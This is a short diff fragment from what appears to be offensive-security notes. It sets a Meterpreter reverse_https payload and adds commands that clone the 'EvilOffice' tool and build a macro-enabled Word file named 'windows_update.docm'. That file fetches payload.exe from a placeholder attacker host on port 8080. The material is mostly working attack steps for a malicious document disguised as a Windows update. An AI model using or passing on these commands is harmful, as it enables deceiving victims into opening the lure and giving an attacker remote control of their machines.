@@ -24,4 +24,8 @@ wget https://get.videolan.org/vlc/3.0.20/win64/vlc-3.0.20-win64.exe -O vlc_setup
 
 set PAYLOAD windows/x64/meterpreter/reverse_https
 
+git clone https://github.com/infosecn1nja/EvilOffice.git
+cd EvilOffice
+pip install -r requirements.txt
+python3 eviloffice.py --url http://<SEU_IP>:8080/payload.exe --output windows_update.docm
 
